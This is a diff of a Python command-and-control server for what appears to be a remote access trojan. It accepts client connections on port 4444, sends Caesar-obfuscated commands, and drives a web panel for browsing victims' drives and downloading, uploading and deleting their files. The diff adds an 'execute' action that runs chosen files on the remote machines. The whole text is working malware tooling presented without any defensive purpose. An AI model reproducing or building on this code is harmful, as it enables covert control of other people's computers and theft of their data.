@@ -12,8 +12,9 @@ import logging
 import urllib.parse
 import select
 import math
+import re
 
-ADRESSE = "192.168.1.35"#socket.gethostname()
+ADRESSE = socket.gethostbyname(socket.gethostname())
 PORT = 4444 
 CONNECT_CLIENTS = [] #liste des sockets ouverts
 THREAD_LIST = [] #tout les threads
@@ -122,10 +123,14 @@ def recv_folder(client, path, addr, i) :
         f = CAESAR_DECRYPT(f_d)
 
         client.send(CAESAR("get_obj_info").encode())
-
+        
         client.send(CAESAR(path + '\\' + f + "\0").encode())
         
-        infos = recv_message_ret(client).decode("latin-1")
+        infos = recv_message_ret(client)
+        try :
+            infos = infos.decode("latin-1")
+        except :
+            pass
         taille = infos.split("/")[0]
 
         if taille != '0' :
@@ -179,12 +184,14 @@ def interact() :
     files = []
     if action != "upload" :
         for f in file_list :
+            if f == None :
+                continue
             files.append(f.split('">')[1].replace("</a>",""))
 
     match action :
         case "download" :
-            print("\n\nTéléchargement...\n\n")
             for i in files :
+                print(f"files:{files} i:{i} FILES_:{FILES_}")
                 path = path_file_ex_2 + i
                 if i in FILES_ :
                     #call download file
@@ -198,10 +205,8 @@ def interact() :
                     recv_folder(client, path, addr, i)
 
                 time.sleep(0.05)
-            print("\n\nTéléchargement terminé.\n\n")
 
         case "upload" :
-            print("\n\nUpload...\n\n")
             filename = easygui.fileopenbox()
 
             if filename == None or path_file_ex_2 == "" :
@@ -216,7 +221,8 @@ def interact() :
 
             fp = open(filename, "rb")
             upload_file(fp, client)
-            print("\n\nUpload terminé.\n\n")
+            
+            time.sleep(0.05)
             
         case "remove" :
             for i in files :
@@ -233,9 +239,21 @@ def interact() :
                     client.send(CAESAR(path + "\0").encode())
 
                 time.sleep(0.05)
+        
+        case "execute" :
+            for i in files :
+                path = path_file_ex_2 + i
+                if i in FILES_ :
+                    client.send(CAESAR("execute\0").encode())
+
+                    client.send(CAESAR(path + "\0").encode())
 
     return 'ok'
 
+def extract_filename(url):
+    match = re.search(r'<a class="centered">(.+?)</a>', url)
+    return match.group(1) if match else ''
+    
 @app.route('/get_data', methods=['POST'])
 def get_data() :
     global path_file_ex
@@ -267,7 +285,7 @@ def get_data() :
     i = -1
     if CONNECT_CLIENTS != [] :
         data.append({"url" : f"<a>..</a>", "modified":"", "size" : ""})
-
+    
     for client in CONNECT_CLIENTS :
         i += 1
         if len(path_file_ex.split("/")) == 1 or path_file_ex == "" :
@@ -281,7 +299,12 @@ def get_data() :
             if client_num != i : continue
 
             client.send(CAESAR("get_drives").encode())
-            drives = recv_message_ret(client).decode("utf-8")
+            drives = recv_message_ret(client)
+            
+            try :
+                drives = drives.decode("utf-8")
+            except :
+                pass
             for d in drives :
                 data.append({"url": f"<a>{d}</a>", "modified": "", "size":""})
             continue
@@ -301,35 +324,46 @@ def get_data() :
 
             path_file_ex_2 = '/'.join(path_parts)
             client.send(CAESAR(path_file_ex_2 + "\0").encode())
-           
-            files = recv_message_ret(client).decode("latin-1")
+            
+            files = ""
+            try :
+                files = recv_message_ret(client).decode("latin-1")
+            except :
+                files = recv_message_ret(client)
+            if files == "" : return ""
+            aaa = ""
+            try :
+                aaa = files.split("/")
+            except : return ""
+            
             FILES_ = []
-            for f in files.split("/") :
+            for f in aaa:
                 f = CAESAR_DECRYPT(f)
-                #print(path_file_ex + f)
 
                 client.send(CAESAR("get_obj_info").encode())
 
                 client.send(CAESAR(path_file_ex_2 + f + "\0").encode())
                 
-                infos = recv_message_ret(client).decode("latin-1")
-                taille, modified = infos.split("/")
+                infos = ""
+                try:
+                    infos = recv_message_ret(client).decode("latin-1")
+                except :
+                    infos = recv_message_ret(client)
                 
-                is_dir = False
-                if taille != "N" :
-                    taille = convert_size(int(taille))
-                    if taille == "0 O" :
-                        is_dir = True
-                    else :
-                        FILES_.append(f)
-                
+                is_dir = infos == "d"
+                modified = ""
+                taille = ""
+                if not is_dir :
+                    FILES_.append(f)
+                if f[0] == "$" :
+                    f = "." + f[1:]
                 if is_dir :
                     data.append({"url": f"<img src=\"images/folder.png\" alt=\"Folder Icon\" class=\"mr-3\" id=\"folder\" /><a class=\"centered\">{f}</a>",
                                  "modified": f"{modified}", "size": f"{taille}"})
                 else :
                     data.append({"url": f"<img src=\"images/file.png\" alt=\"File Icon\" class=\"mr-3\" id=\"folder\" /><a class=\"centered\">{f}</a>",
                                  "modified": f"{modified}", "size": f"{taille}"})
-                
+    
     json_data = jsonify({"data":data})
     return json_data
 
@@ -343,7 +377,7 @@ def ban() :
     print(Fore.RED + "  / /   __ _ (_)| | __ __ _ ")
     print(Fore.RED + " / /   / _` || || |/ // _` |")
     print(Fore.RED + "/ /___| (_| || ||   <| (_| |")
-    print(Fore.RED + "\____/ \__,_||_||_|\_\\\__,_|")
+    print(Fore.RED + "\\____/ \\__,_||_||_|\\_\\\\__,_|")
     print(Style.BRIGHT + Fore.GREEN +"Là où finit l'État, commence l'arc-en-ciel." + Fore.RESET + Style.RESET_ALL)
     print("")
 
@@ -489,7 +523,7 @@ def main() -> None :
                 c = CONNECT_CLIENTS[i]
                 addr = c.getpeername()[0]
                 pays = ""
-                match = geolite2.lookup(addr)
+                match = None#geolite2.lookup(addr)
 
                 if match is not None :
                     pays = match.country
@@ -563,7 +597,10 @@ def main() -> None :
 
             fp = open(fichier, "rb")
             upload_file(fp, client)
-
+        
+        elif cmd == "" :
+            pass
+            
         else :
             print("Commande non reconnue, \"help\" pour afficher la liste des commandes.")
 
